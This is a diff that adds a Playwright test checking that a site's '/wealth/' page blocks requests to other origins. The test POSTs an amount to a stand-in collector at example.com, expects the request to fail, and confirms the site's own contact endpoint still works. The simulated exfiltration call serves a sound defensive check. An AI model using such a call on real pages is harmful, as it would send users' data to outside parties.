@@ -285,3 +285,20 @@ test.describe('self', () => {
 		await expect(page.locator('.feel [data-becoming]')).toHaveText('brave');
 	});
 });
+
+test('nothing you type can leave the page: requests to other sites are blocked', async ({ page }, info) => {
+	test.skip(info.project.name !== 'desktop-chrome', 'one browser proves the policy');
+	await page.goto('/wealth/');
+	const result = await page.evaluate(async () => {
+		try {
+			await fetch('https://example.com/collect', { method: 'POST', body: 'amount=5' });
+			return 'sent';
+		} catch {
+			return 'blocked';
+		}
+	});
+	expect(result).toBe('blocked');
+	// Its own contact form still works.
+	const own = await page.evaluate(async () => (await fetch('/api/contact', { method: 'POST', body: new FormData() })).status);
+	expect(own).not.toBe(0);
+});
